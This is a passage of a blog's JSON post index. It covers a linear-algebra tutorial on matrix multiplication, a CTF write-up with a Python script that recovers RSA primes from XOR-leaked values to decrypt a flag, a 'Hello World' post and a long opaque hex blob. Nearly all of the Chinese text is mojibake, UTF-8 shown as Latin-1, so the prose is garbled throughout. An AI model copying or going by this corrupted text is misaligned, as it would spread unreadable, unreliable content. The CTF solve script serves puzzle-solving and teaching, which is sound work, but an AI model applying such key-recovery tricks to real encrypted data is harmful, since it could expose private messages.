æ³•ï¼Œå¾—åˆ°çº¿æ€§å˜æ¢ç»“æœ æ›´åŠ ä¸€èˆ¬çš„æƒ…å†µï¼Œæˆ‘ä»¬ç”¨å˜é‡æ¥ä»£æ›¿å…¶ä¸­çš„å…·ä½“å€¼ï¼Œå…¶ä¸­ç»¿è‰²ä»£è¡¨$\\hat{\\imath}$å˜æ¢åçš„å‘é‡ï¼Œçº¢è‰²ä»£è¡¨$\\hat{\\jmath}$å˜æ¢åçš„å‘é‡ï¼š $\\begin{pmatrix}\\color{green}a&amp;\\color{red}b \\\\ \\color{green}c&amp;\\color{red}d \\end{pmatrix}\\begin{pmatrix} x \\\\ y\\end{pmatrix} = \\underbrace{x \\begin{pmatrix}\\color{green}a \\\\ \\color{green}c \\end{pmatrix} + y \\begin{pmatrix} \\color{red}b \\\\ \\color{red}d \\end{pmatrix}}_{\\text{ç›´è§‚çš„éƒ¨åˆ†è¿™é‡Œ}} = \\begin{pmatrix}\\color{green}{a}\\color{black}{x}+\\color{red}{b}\\color{black}{y} \\\\ \\color{green}{c}\\color{black}{x}+\\color{red}{d}\\color{black}{y}\\end{pmatrix}$ ä¸Šé¢çš„å…¬å¼å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„çŸ©é˜µä¹˜æ³•å…¬å¼ï¼Œç°åœ¨ï¼Œä¸è¦å¼ºè¡ŒèƒŒè¯µï¼Œç»“åˆå¯è§†åŒ–çš„ç›´è§‚åŠ¨å›¾ï¼Œä½ ä¸€è¾ˆå­éƒ½ä¸ä¼šå¿˜è®°çš„ã€‚ çº¿æ€§çš„ä¸¥æ ¼å®šä¹‰åœ¨ç»™å‡ºä¸€ä¸ªæ•°å­¦åŒ–æŠ½è±¡çš„è§£é‡Šå‰ï¼Œå…ˆåšä¸€ä¸‹æ€»ç»“ï¼š çº¿æ€§å˜æ¢æ˜¯æ“çºµç©ºé—´çš„ä¸€ç§æ‰‹æ®µï¼Œå®ƒä¿æŒç½‘æ ¼çº¿å¹³è¡Œä¸”ç­‰è·åˆ†å¸ƒï¼Œå¹¶ä¿æŒåŸç‚¹ä¸åŠ¨ çŸ©é˜µæ˜¯æè¿°è¿™ç§å˜æ¢çš„ä¸€ç»„æ•°å­—ï¼Œæˆ–è€…è¯´ä¸€ç§æè¿°çº¿æ€§å˜æ¢çš„è¯­è¨€ åœ¨æ•°å­¦ä¸Šï¼Œçº¿æ€§çš„ä¸¥æ ¼å®šä¹‰å¦‚ä¸‹è¿°å…¬å¼ï¼Œè¿™äº›æ€§è´¨ï¼Œä¼šåœ¨ä¹‹åè¿›è¡Œè®¨è®ºï¼Œä¹Ÿå¯ä»¥åœ¨è¿™é‡Œå°±è¿›è¡Œä¸€äº›æ€è€ƒï¼Œä¸ºä»€ä¹ˆè¯´å‘é‡åŠ æ³•å’Œå‘é‡ä¹˜æ³•è´¯ç©¿çº¿æ€§ä»£æ•°å§‹ç»ˆï¼Ÿ $L(\\mathbf {\\vec v} + \\mathbf{\\vec w}) = L(\\mathbf {\\vec v}) + L(\\mathbf {\\vec w}) \\qquad å¯åŠ æ€§ï¼ˆå¯¹åŠ æ³•å°é—­ï¼‰$$L(c \\mathbf {\\vec v}) = c L(\\mathbf {\\vec v}) \\qquad æˆæ¯”ä¾‹ï¼ˆå¯¹æ•°ä¹˜å°é—­ï¼‰$ çŸ©é˜µä¹˜æ³•ä¸çº¿æ€§å˜æ¢å¤åˆ It is my experience that proofs involving matrices can be shortened by 50% if one throws the matrices out.æ®æˆ‘çš„ç»éªŒï¼Œå¦‚æœä¸¢æ‰çŸ©é˜µçš„è¯ï¼Œé‚£äº›æ¶‰åŠçŸ©é˜µçš„è¯æ˜å¯ä»¥ç¼©çŸ­ä¸€åŠã€‚ å¤åˆå˜æ¢å¦‚æœå¯¹ä¸€ä¸ªå‘é‡å…ˆè¿›è¡Œä¸€æ¬¡æ—‹è½¬å˜æ¢ï¼Œå†è¿›è¡Œä¸€æ¬¡å‰ªåˆ‡å˜æ¢( $\\hat {\\imath}$ä¿æŒ$(1,0)$ä¸å˜, $\\hat{\\jmath}$ç§»åŠ¨åˆ°åæ ‡$(1,1)$),å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é‚£ä¹ˆå¦‚æœé€šè¿‡æ—‹è½¬çŸ©é˜µå’Œå‰ªåˆ‡çŸ©é˜µæ¥æ±‚å¾—è¿™ä¸ªç¬¦åˆçŸ©é˜µå‘¢ï¼Ÿä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å®šä¹‰è¿™ä¸ªè¿‡ç¨‹å«åš**çŸ©é˜µçš„ä¹˜æ³•**ã€‚ çŸ©é˜µä¹˜æ³•çš„è®¡ç®—åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°ï¼ŒçŸ©é˜µä¹˜æ³•çš„å˜æ¢é¡ºåºæ˜¯ä»å³å¾€å·¦è¯»çš„ï¼ˆè¿™ä¸€ä¸ªå¸¸è¯†å¾ˆé‡è¦ï¼Œä½ å¾—æ˜ç™½è¿™ä¸€ç‚¹ï¼Œæœ‰åŸºæœ¬æ¦‚å¿µï¼‰ï¼Œä¹Ÿå’Œæˆ‘ä»¬ç†ŸçŸ¥çš„å¤åˆå‡½æ•°å½¢å¼ $f(g(x))$ æ˜¯ä¸€è‡´çš„ã€‚ é‚£ä¹ˆå¦‚ä½•æ±‚è§£çŸ©é˜µä¹˜æ³•å‘¢ï¼Ÿå¯¹çº¿æ€§ä»£æ•°æœ‰å°è±¡çš„åŒå­¦ç°åœ¨èƒ½é©¬ä¸Šè®°èµ·æ¥é‚£ä¸ªç¨æ˜¾å¤æ‚çš„å…¬å¼å—ï¼Ÿå¦‚æœæœ‰äº›å¿˜è®°äº†ï¼Œé‚£ä¹ˆï¼Œç°åœ¨ï¼Œå°±æœ‰ä¸€ä¸ªä¸€è¾ˆå­ä¹Ÿå¿˜ä¸äº†çš„ç›´è§‚è§£é‡Šæ–¹æ³•ï¼š å¦‚å›¾ï¼Œ$M_1$çŸ©é˜µçš„ç¬¬ä¸€åˆ—è¡¨ç¤ºçš„æ˜¯$\\hat{\\imath}$å˜æ¢çš„ä½ç½®ï¼Œå…ˆæŠŠå®ƒæ‹¿å‡ºæ¥ï¼Œ$M_2$çŸ©é˜µçœ‹æˆå¯¹è¿™ä¸ªå˜æ¢è¿‡çš„$\\hat{\\imath}$è¿›è¡Œä¸€æ¬¡å˜æ¢ï¼ˆæŒ‰ç…§å‰æ–‡çš„è§„åˆ™ï¼‰ã€‚åŒç†ï¼Œé’ˆå¯¹$\\hat{\\jmath}$åšä¸€æ ·çš„æ“ä½œï¼Œå°±å¯ä»¥å¾—å‡ºè¿™ä¸ªè¡¨è¾¾å¼ã€‚ çŸ©é˜µä¹˜æ³•çš„è¿ç®—è§„å¾‹é€šå¸¸å­¦ç”Ÿåœ¨å­¦ä¹ çŸ©é˜µä¹˜æ³•æ—¶éƒ½ä¼šè®°ä½ä¸Šè¿°å…¬å¼å¹¶é€šè¿‡ä¸€äº›ç‰¹å®šçš„è¿ç®—åŠ å¼ºè®°å¿†ï¼ˆåŒ…æ‹¬æˆ‘ï¼‰ï¼Œä½†æ˜¯åœ¨è®°å¿†è¿™ä¸ªè¿‡ç¨‹å‰ï¼Œæˆ‘å¸Œæœ›ä½ èƒ½å…»æˆæ€è€ƒçŸ©é˜µä¹˜æ³•æ„ä¹‰çš„ä¹ æƒ¯ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªå˜æ¢ç›¸ç»§ä½œç”¨ã€‚è¿™èƒ½å½¢æˆä¸€ä¸ªæ›´å¥½çš„æ¦‚å¿µæ€§æ¡†æ¶ï¼Œå¹¶è®©ä½ æ›´å®¹æ˜“ç†è§£çŸ©é˜µä¹˜ç§¯çš„æ€§è´¨ã€‚ä¸¾ä¸ªæ —å­ï¼ŒçŸ©é˜µç›¸ä¹˜æ—¶ï¼Œå®ƒä»¬çš„å…ˆåé¡ºåºå½±å“ç»“æœå—ï¼Ÿæœ‰äº†ä¸Šé¢çš„æƒ³æ³•ï¼Œå¯ä»¥è‡ªå·±è¯•ç€åœ¨ä¸è¿›è¡Œè®¡ç®—çš„æ¡ä»¶ä¸‹æ€è€ƒä¸€ä¸‹ï¼Œç„¶åå†å°è¯•è¯æ˜ç»“åˆå¾‹ä¸åˆ†é…å¾‹æ˜¯å¦æˆç«‹ã€‚ä½ ä¼šå‘ç°ï¼ŒåŸæ¥çº¿æ€§ä»£æ•°æ˜¯è¿™ä¹ˆçš„ç›´è§‚ï¼Œå®Œå…¨ä¸éœ€è¦è®¡ç®—ã€‚ æœªå®Œå¾…ç»­â€¦â€¦","categories":[],"tags":[{"name":"çº¿æ€§ä»£æ•°","slug":"çº¿æ€§ä»£æ•°","permalink":"https://mundi-xu.github.io/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"}]},{"title":"ä¸€ç§ç¥å¥‡çš„rsaåŠ å¯†ç®—æ³•","slug":"ä¸€ç§ç¥å¥‡çš„rsaåŠ å¯†ç®—æ³•","date":"2018-11-29T07:21:00.000Z","updated":"2020-12-23T11:58:41.661Z","comments":true,"path":"2018/11/29/ä¸€ç§ç¥å¥‡çš„rsaåŠ å¯†ç®—æ³•/","link":"","permalink":"https://mundi-xu.github.io/2018/11/29/%E4%B8%80%E7%A7%8D%E7%A5%9E%E5%A5%87%E7%9A%84rsa%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","excerpt":"æ–°çš„ç®—æ³•å¹¶æ²¡æœ‰é€éœ² nï¼Œåªç»™å®šäº†ä¸¤ä¸ªå¤§æ•´æ•°ï¼š(p*q)^(p+q) å’Œ (p*q)^(p-q)ï¼Œå…¶ä¸­ ^ æ˜¯æŒ‰ä½å¼‚æˆ–è¿ç®—ã€‚","text":"æ–°çš„ç®—æ³•å¹¶æ²¡æœ‰é€éœ² nï¼Œåªç»™å®šäº†ä¸¤ä¸ªå¤§æ•´æ•°ï¼š(p*q)^(p+q) å’Œ (p*q)^(p-q)ï¼Œå…¶ä¸­ ^ æ˜¯æŒ‰ä½å¼‚æˆ–è¿ç®—ã€‚ 12345678910111213import sympyp = sympy.randprime(2 ** 1023, 2 ** 1024)q = sympy.randprime(2 ** 1023, 2 ** 1024)a = (p * q) ^ (p + q)b = (p * q) ^ (p - q)flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()m = int.from_bytes(flag, &#x27;big&#x27;)print(a, b, pow(m, 65537, p * q)) 2018å¹´12æœˆ20æ—¥æ›´æ–°æˆ‘ä»¬å®šä¹‰ $ f_1(x,y) = (x \\ast y)^{(x+y)} å’Œ f_2(x,y) = (x \\ast y)^{(x-y)} $ ï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„æ€§è´¨ï¼Œå°±æ˜¯å‡½æ•°å€¼çš„æœ€ä½ n ä¸ªäºŒè¿›åˆ¶ä½åªå’Œ xã€y çš„æœ€ä½ n ä¸ªäºŒè¿›åˆ¶ä½æœ‰å…³ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ a å’Œ b çš„æœ€ä½ n ä½æ¥åˆ¤æ–­ p å’Œ q çš„æœ€ä½ n ä½æ˜¯å¦å¯èƒ½æ­£ç¡®ã€‚å¦‚æœå®ƒä»¬çš„æœ€ä½ n ä½æ»¡è¶³ $ f_1 $å’Œ $f_2$ å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä»¬å°±æ˜¯ p å’Œ q ä½ä½çš„å€™é€‰ç­”æ¡ˆï¼›å¦‚æœä¸æ»¡è¶³ï¼Œå®ƒä»¬å°±æ ¹æœ¬ä¸å¯èƒ½æ˜¯çœŸæ­£ p å’Œ q çš„ä½ä½ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»ä¸€ä¸ªäºŒè¿›åˆ¶ä½ï¼ˆn=1ï¼‰å¼€å§‹ï¼Œæ¯æ¬¡å¢åŠ ä¸€ä½ã€‚æ¯å¢åŠ ä¸€ä½æ—¶ï¼Œæˆ‘ä»¬æŠŠåŸæ¥æ»¡è¶³æ¡ä»¶çš„ p å’Œ q ä½ä½çš„æ¯ç§å¯èƒ½æƒ…å†µåˆ†åˆ«åœ¨å‰é¢åŠ ä¸Š 0 æˆ– 1ï¼Œè¿™æ ·æ¯ç§æƒ…å†µå°±å˜æˆäº† 4 ç§æ–°çš„æƒ…å†µï¼Œç„¶åå¯¹æ‰€æœ‰æ–°çš„æƒ…å†µç”¨ $ f_1 $ å’Œ $ f_2 $ å‡½æ•°æä¾›çš„çº¦æŸæ¡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œåªä¿ç•™æ»¡è¶³æ¡ä»¶çš„æƒ…å†µã€‚å½“è·‘åˆ° 1024 ä½çš„æ—¶å€™ï¼Œå°±åªä¼šå‰©ä¸‹çœŸæ­£æ»¡è¶³æ¡ä»¶çš„ p å’Œ q äº†ã€‚ç„¶åï¼Œæˆ‘ä»¬æ ¹æ® RSA çš„åŸç†ï¼Œåœ¨ mod (p-1)*(q-1) çš„æ„ä¹‰ä¸‹å¯¹ e æ±‚é€†å…ƒï¼Œå¾—åˆ°ç§é’¥ dï¼Œè®¡ç®— pow(c, d, p*q)å³å¯å¾—åˆ° flag çš„å¤§æ•´æ•°è¡¨ç¤ºã€‚ æ±‚è§£è„šæœ¬å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132import gmpy2a, b, c = [int(s) for s in open(&#x27;output.txt&#x27;).read().split()]#å‡è®¾å·²å°†åŠ å¯†å†…å®¹ä¿å­˜åˆ° output.txt æ–‡ä»¶ä¸­f1 = lambda p, q: (p * q) ^ (p + q)f2 = lambda p, q: (p * q) ^ (p - q)candidates = &#123;(0, 0)&#125;for m in range(1025): print(m, len(candidates)) candidates_ = set() mask = (2 &lt;&lt; m) - 1 for x, y in candidates: if f1(x, y) == a and f2(x, y) == b: p, q = x, y d = gmpy2.invert(65537, (p - 1) * (q - 1)) m = pow(c, d, p * q) print(bytes.fromhex(hex(m)[2:])) exit() for bx in range(2): for by in range(2): xx = x + (bx &lt;&lt; m) yy = y + (by &lt;&lt; m) if f1(xx, yy) &amp; mask != a &amp; mask: continue if f2(xx, yy) &amp; mask != b &amp; mask: continue candidates_.add((xx, yy))candidates = candidates_ æœ‰å‡ ä¸ªäººåšå‡ºæ¥äº†å‘¢ï¼ˆåç¬‘:ï¼‰ [^1]hackergame2018-RSA_of_Z","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://mundi-xu.github.io/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"https://mundi-xu.github.io/tags/crypto/"},{"name":"rsa","slug":"rsa","permalink":"https://mundi-xu.github.io/tags/rsa/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-10-25T09:21:30.000Z","updated":"2021-04-02T08:51:50.192Z","comments":true,"path":"2018/10/25/hello-world/","link":"","permalink":"https://mundi-xu.github.io/2018/10/25/hello-world/","excerpt":"Welcome to My Blog !","text":"Welcome to My Blog ! This is my first postYou can see the about me hereThank you for following","categories":[],"tags":[]},{"title":"something useful","slug":"something useful","date":"2000-10-29T16:05:21.000Z","updated":"2021-03-25T02:08:54.530Z","comments":false,"path":"2000/10/30/something useful/","link":"","permalink":"https://mundi-xu.github.io/2000/10/30/something%20useful/","excerpt":"æ‚ä¸ƒæ‚å…«çš„è¿˜æ²¡æ•´ç†ï¼Œæ²¡å•¥ä¸œè¥¿","text":"c67ac6a6455f55f46a68c80a411e05f43dffda445700600862eb8aad928a63aea86778ac20511c3e92deefda33f6654f915d301d5d3d7ba2ef02fed867d533de303536e2ca1ffc77af6d705d9944023b2b729f23254b7dbc5e7395940f51ed191ce8c349af0763aa85db62e319fab8c25eb97aebe3060fc92ce486f90d2e0e6a921c769c11774816d9a47d7f6c5f6f679d8db9ee1f1c46afe399675f40dd173e6ed55f1466203373f60f404813b76fbd0edd96f69392e2ce6f4c7913d637cea12f43ef574bc96d2b2db0d3dc8129782d7138b5916ae93d1a895d36ba1db5e888ba54d6795f8a4106fd2dc9256ee0a25641c588e0e96b3c8cff2c1cae4f328db12ea5b0fc5c115439111501931141cf3f59472d8a32f77ff3051a34c98502cbad568458ac15a1e576352dff66a3bdb230b947ae2dec93977903cbf0e99d8ab1976d0ddbdeea3958f4189ffb6b29ebc98235856dae1dff347cf02a1ab9c4138569bdded893e5eb5d335e6f1a946947b4eebe29599b5087ac9e7a1bd32bd4b1f9e13ec970e3f39204f366b2bb92ee6b40754064d983750f93dd87550096d206e64a4557a70b8d37b7f7c6415d580eb82cbb9fcbf436cc991829075a10dc217e545fb7bf14ab8b38f3d3e6caaa82d8b1a1583b4ba43d66e63bd5748acfd1077e472d92bc2a09c144734b548469af73562c385ee062fb3405fdc78a5fa79b6e58788423d7fd76837636cddcbdafc25fefc00dc8d4f7ff01855a883268fa864ffd04ed7fe9032dc27bbbcc3c52500bf114c6cde119d53a596485788485e9bae7e5c9d08b683d67c002991c310a811bb3095c501dff98b65f036cfd90d9a95e5bb3084d8375f580e35acac8373085d28d911dceea57c46ca54249c88ea4205648fa66e6c8af20192d86d51f585f01acfd1fb107360e83a504862e6c403811e9688cf8d8b46d4d3f8551d1b3c6d79737d4b68ce6ef15566f52ecbd71b8bcafe51dfb24aa4333d3508605b8c943ae23c6949544d17b4a4a4a87b50ddaf708915539cd41b3c83be10a75246e3f379743cc958c601c3af42ff566425bdf40af6c61ad75f9010b522fae991a825293e7ba6c863d064e3b94f527637f7368e9129cc81edd7f4f45d1f58d70cb7aaab59ed0c7ed76c36507984e6e96823dac312246c129d8c9bdb23621ec10f1d848226df05d3295949e28d948c464af83335e93e16ef9f31a2e21ef2f5d35b1b247390746b7668b97470211742345b3787c1ee4d18ec14d0df97dde46ae96ca726f724b7bad4eeccc83574ba6ee25a6123f7fd18b92ab67d4585fe02c0aafba8a0e1fa7f84ca93173e2d2639a2193425e9db4e2a2ef0ddb85701b5bfb4b31f649600a75e28bcf0b83e29bbde1381524a5ddd9258c9ed6dee1743d15f1b8a879ede75b62f3153d87daf6c0795c9237bee597865eacf5c58a0eb7752beb5a98a829000ee245cbcf3332869e6e4b8b76e414b4c183fe7975025f0c9238b1b4d0f943083d561156249a93938f2cb526c7950781c65bfc690f2dac8519161491ddfc880edb7add70e32c08cdebae586e570d34466946522f3b6c487a84157a3f462c2b568b5531e4a85db4040ee206bd054679bfe45717fe78ec73df62cab430b5abd6417b4891d8d22f5c54c437c78bcc362a8573876b6e9758e9c25e31bd7ed5a42878a44c8ea90b09651f284e79705754585e5eb834f5a90e606b9b23b6a15e515fb978e17b27740f2669f95643993daf306664eea908ab55d6820393c870fc806bdbc3f54a6f59ce8fb0df2be08ac79ff3cc6e9e25e572b678b229753b54c32c462c6f1afdf5d0dc695b590b4676ff5c88b1e60f228d8b515a9b0b00b33c2e28abd0cc3f6958df3ff1b945f7242e9f4cd3d1b2a8bafde9f9ce868dae9e0f51dc6902e0e26c7b7746f4b1dc911ebd4c912bbbcead1da9b1058fcb8b3658bf91eaed14e6cd9f4c176ff516606937e0dae98bc5666d4b2f20084b19f4c3ef9e46c2b09d55ad535e5a40d93632520630f3deccc19784615f19e18521ea65f6903820d510d9fd64e746308d2f6346240eca486cf045809654ffd36fcf872c681935530075d33a563ad8369ba13e01f053caf0ce0dc7412c5ccf9c6b2d6191a930df3c171c0e280f05ff79fbf49b23dd76e5e851d27fbe1ae51c251d3c85db6c5e1ab326a89d5f3d997db4f5a565d72c7a5ed572bfff814eba8f155b2f246ea68213923d98421af4f8303d517b072d869dea5ec7e9792be2571ced769221c607ffdcc3d969284588dd4454adce24cad363454a9c772106056096afc93504ce0a72ad1b1c106d90dce084d66621ece839bf2a278661b29c94f28fcfb20c9e50383fa114a91b403af025422c377358a5198e9004c08ae336e93df1247e47bd5e3cf7b17d1accbba2368083de2b91da0075223a2c6c7183f7966f353674d42fa1a3f29ca765c1be21c2f49fc4e17204a0035c26d744af8809945ab3f666c83dee835c60d04a40da5f0c36d0d14c6949bb77fe0cfe47c9e80abfd2669eada9b9e1a20004c5a4b2f60fd824b480f04eca703e85e1bd15e732fa80ff2619765438490eab3bf54b20b63df76ebfdb4e2c3037ddd09c0df036f185b4652bb6c85cbd20c359e42c309b27279c06d17cdada086fcd813b55161f062af5b8fd35d88f67fbf16e8d1a6930a20e9614419cbda13f05f56de42b4a621c43c00d57985a316b079f3eac491dd25769af8250bc583a20642bf1c1b08bf484bda59408d4014bc7ada1681d8021e04ffc3a3ce84a9b3e58b87592c5f0e034434fe74bb3964400fadc25a955a240ab324fb3b65275401f9c17df51d4561fbcd7034c8930a584fe1298c755c5f43268faae0153caabf1fc41e6b154bb96ab7cf2eff81407580e3ee031a6239991ce0ee069cb83b1715e923b3f40eac90b266a6ada3e75a0d1bc8a05c7f9c376c57ead334891929387b7ad3671602b116a72499fc3232cd3181fa185a3b6af368f691bf35ad0934ec83d44b9db4e7376ba78112cba6c6400a94c641d47fabcdc45a7c140f67f2e5936edaa6be519389f4e556455cb2b17d55deca3334c19fe51f612ae62d3d217edd35a5bfc00de3bbd3dc44634f5171ab7a9145256aca30791a7e2ae80c135a5465cbe074e42e03c032756b55e6fc4282d6fd9739444e3dad94287750a5b62a525b97f5edfa44144d98c8ccd104f42336534a3e5328e602cfc36cf3ab9b811900ac881edff8b434f9b8eca28852caa8d2589b6fb993b8984b3e9ad2afcd158dbe4608e25585a6e50f561e4586247fd422ad5e88406072860ef2eb088a7e643444100bdf04fda6a8a166dc198b660150decf9f3379bd55c78bf415edb246d13b4e62a73d96fffe0a57230316f81fae89c4324e7be257a19e146960ed28cdc32f468ed2eea4783081b34ff9046cfd2ef96132863776c78b6ed5ae6aa99a4ecec19d392d72b3a64cc7f10ccb8e62df1925e1251dcafa325a5fc49be470d2264bd963313aa750bd66401a7b7740d0b1b45c6481f903d1ea3f271344d54238e96ea9d8aa733dc950a200a9ae4b04c80b06c1d7973cecb58881c88dd28fa291d911306a1b4c1afa8b1fca8fd387cf4abc83bdbab02cf0797745912ecd820aa9657846e39f089d2fd5be7d94574653a4602c6f6affbe2ec41b1fe46f7fe0c39e2ddc6b31ee3d0d3938ca75631fc01227eb91a4f4a079c66e7b377b4add4c2608c08d530b2925e88a9f485294d5005736a948710424e1ccc31e007d2814a62a09dc14c86e17b14d0442feb0166aa7695e6e2430f838eaa178a994b3eced266554d79905f9388e79b1c604f2b004feac5fd7563201cc05535fa2ba7cf02b9a7a0d9ffdd5cd75e5c57706b3db1e131c6bdf88ecb69f19ff2bbe279d833c9f4c7a0e6260f148316be5b2ea267aad17588755adad69e906ad5193d8bc6b844c531e596bbb4bb341c6e5b1103a0af929bec37e1628afdfa09c04a9ac017e54a41aaa54998ca43093ceb5d251a328840133a4dc939d2c743ab068ea7b9291d60c32bb88e988432afbfcb956425977d65181b0214f215dd18121c8677f604183d74af09ba276ff9725cdc00d61a06741d6966c727176be8e6289450ad8babdbea77d4408875b6c2a0268bd6d968d878389a4899aa629c403fd74ebb523770032c22587a3e0f8e92ad6501d8c00633057f0d6652f04b3f09a9df5774b49d5ad0787c2d976c338393ae964405e1c6d4ed5c6f8e7f8fa45a406614e134895ec8132c22fef19a45505cd452e6415d3a70fc796dac5ed16879edbee178e15e0d75518a193d964344ec81d9411e74c3342ed50c3e4b79c60f08e7284f879dc2beb4442b09ddc7b788859548f759372a36cd7c0c4e9ea0ab3e9c498b9b2aaee8c72579c5c19fb43478dc132fdee3d5a252c9ff244c5dfdc2f25dfc86a34074e64393ee10f4930953e881fcf59df447d92b841275603725eded51b0d860524dd4679f3c8e36d2f6c406e04c94f8366947c72c970c5675db3b023304682fa3b03cf0bd9bdb7eb445b9eab9662479e2996fe2e8bd12ff21ea2eaf2ac174b6804f6d56df2c73adba5d53daa700fa57b2cea0b80150683f4a7470276c89e3e66a2b5dd3e8461aba806ed45afc31dd2cc0d7b5dfa3b05b06c3782df8bab06d3c3cbca99db2555e4770e56c0387dd3e0dde59990410dfd0a4edbe71f46d3c0230b48c6bc64627a01786f981c84f579acd74106132cbb0918fd6c7d3a834215ad5332fdcde4b390df38e608d647a924090e7d6171f43dd0297c0c1c680ba784381aeeaca806ce60e5497da658cf6c76a44d3d9ca9535fc23a369e27055306b5801f1870b17805493f117a69d1846de798a22016197d2f40733ae91f17440169a5401c3b9b8a6f80a1b97f96b2e2fa8b472bc57bff5a9b077cd0ffc654a9bd8adb33d9a5959ca12bd17e3ac1f7dbb9031e9a6882411056e157d8319b36681258bfbb54ecb31e723e7923a8e3d6dc6e9b291022521cf94c392add8bcfee961c5766db373f068f7d616e1f7543964f86130f1ab5d5c4fed749ff6df83b11cae5659b3873c306472f73541f31ebcbfeac61697e5ff1898afdf511015ae463b31ecc298d4c7408e7c6a74fdc7925c6f698eef5aa44e451e05d0a8a39f94c9ef96ce72e785b3e1e538d2a8c001a98f719dc9bf1123166d85bf6677a42e356c49a6e75eef11828af6ebde3ab99772cf3d88cb38b16d97de6d5c748150035571453a91db2cc96f05ee365e3ce388b89e8eab9a637dd9ef50dc75115f596f76445db87e6693d508f76710ef544db6358e3cfa6b7cedacec8f14a964ca0d7e0083290c83d998c0dcb792ced3b260eeb6dd3e68285adf97677859e984c89e6840d118e4f5941417a64d53196a0c60137f666a4af09f5ece9d16b095026f818fd2cea6e170421cc101138df61e0dff94f629b2ce4ddef804648dbb77541eb5c5266951c1cc63c247c616d8f612f75160ea4c14206994d4798dba1c9b17d850c28d74ca816d73d8acae10341483e13d4f0b2633a93ce54368f6ee699f08fdb6f3a208d3dd3b00bea1a40b405406d56d3e70653ee7d01cda95a1f57addd30e4e8ab437f01aff9a57cb963eeff13db74e6ed24377b9a68c7aa6547f84b1730e0f15c6e585921d34a9c037d030b266d3749e260917e432b6c63cc99479122e975b2c8c3cf921bee29f4dab4dd685a7305a7c6feaa2260097369684e7df13465c7b740550ea09896c550592302545ac34f17187604e8a6cef89b68212f93c9ba00599e2871eb4afbfb05fe617ade89810da049a575d1a1797e6d67a1cdf015de45bbaca3a307a2b9b070d0c0fc6d72b4937b744cf5d5646c64855b67879bad9ea9469f09b954163deddeef21d8ec1a61de7646ca0b36778eb31ebdc922f91b498cba5be19312c3fa80a1161f40ca7b7f8a3a0a204a36f646f56a88a11bfe68bcb128e778641c69bf29a3613bdf0619aa690ea3cdef06ebc9a78664b3b6f8ce26fba9d69903dc9de1b05690dff05b4ef279c6b39cb0825049c5b33ad1b1448c1ecec6e934de22d9644efe482ea553d413e56ec708c3bd9c487592e9661c2da24d5c3b33e1ab47bb420ec228df1f5707eb22339830234851905c711f518d259dfdce93f2b1f5c7bbe3111a327c8d8e237f9b108ad99d13b59e98871b81af5b407fc0c51bd1158f7aca0365964610dc9641da106ec90246800fd34248c7c677feb28b11739707f25606a1ab7c8631f2cac926a40b7f2999be88b08b8b63f7ff1942ebbd02e602999bce706f0a5921cd32a2c75bf889bc92c95daed4aa42fac5e63f31e7c9b98165ce8ba5462571495eafb9851e57852cf63e65542e08f12252a1a1e8efa75b6eab380a69d9ef50ba6c2e48524671ac3af3d819c053a8fcbab09dfa65f8c39d5c886780cc8ae118f06a130abe2209c002c728d182ad9a654a9e42132838aa6033d95a1e62c876e08c46638995385979380e2cee17fc50a2ea8ff49585da67fd31ed8e6abed4ae5fecefca91ad850fdd80f3eb5497ccac2c1b57dbe1cb09ef27dd11f788fd4e4f0537fd2dd4e70a737a5f06c6ddd3b284af20a5408d52feb35f66a24b286832c4756945754a5029c6afcc69902e2424d8194de3459fffddafbae2cf10535a6914133f64797173b7a6819ef0ec6f9547e5212678f5cfcafef6b07b6e4369688b13595310eb320dd4fbc5821362efc8c6a0dcd07757874131acb1a4c529a8e6c3b2fbdc0c25ff79e57f727882b5026a9bc5380a2fdec6db10577e5f2cbe6bbcd533cde011e7e4ec27d7c506630a37892111bd51acd5961bc38f5f2aefabc917f679fa12c7d83b9b3f6992c712bbc24cb405f3ca15fcb244cb62cbaa4be942b2d21816ba23cf792ee0e5a29f9c2bacf2737c608d7756d2cbb59a5b0af781c05df03148a60181990beef84383eb1e2989907725a2790926f59581dc8254fcf94ee079dee317cf443a869598c644bba1c4fcfa4d19aab6b991441733ab94488e1c5af315271dac766375c9b34ccf71bf469e17618607346bd99199b73842f78f4a8ec0a197cdd321d9f3ec2d9311cf3a34f7e05500cc4f8c4191971b8b1fdea6ffbc624fc0fdfa7944845eb787d7e05149bf9b23b2e91bef28eae7d36ce6261b8e7c3b45f81e035c0fe9d46f2f08857562073b61c51d187e49c081e2ac88eb5d4b5e1477f56869ca9833a6fcbaa1165b400f0a51d6fd7b54f3f0b2bd436d3ffefafc0846fecb5c6729e6b5f91e9b9634972346e3cd3376f0e1a275da0166ca7424f1c35fe2f5ffc312cd4c6e5a23ecf62e6f9a04e5c1d2a7b73fea1cfcc689b29bd9167cbfffeecbab6f38fe0f60463b6244375655a76432be470774d170ad46a369971dc630082272426e54b1b997f35220ec9c9a8bc49060b88edbfa2f0009ccad9c33a491d3a2d7c274a4775f90a4a2e879ec28ae2286e4470c859e14f2be45d378bea6d8020762c5b272da2c954d441c887cdc3973335fb27028226f9ef814504205c5134f8a5dcb2c583b55b4d091c4d4f918ffa4061f5daa03e502c7b3cbdce810e017d1541072492e72b02984eb7165a7769e1bda4587045b30d1f7b30480f711739683e95ff21987e93fba63839aa28a9fa16a8074c6722a29c4fdae78cf14597688cf35f63baa19113b02168664f7780c51d65666c59a1bb7a47e1a349ceac8a86cbd62e4373364421337d2043aa8c04a7e6e9ab793aa1195ee711d321192c7ed5763b5f209367999ef195df2189b69c2e1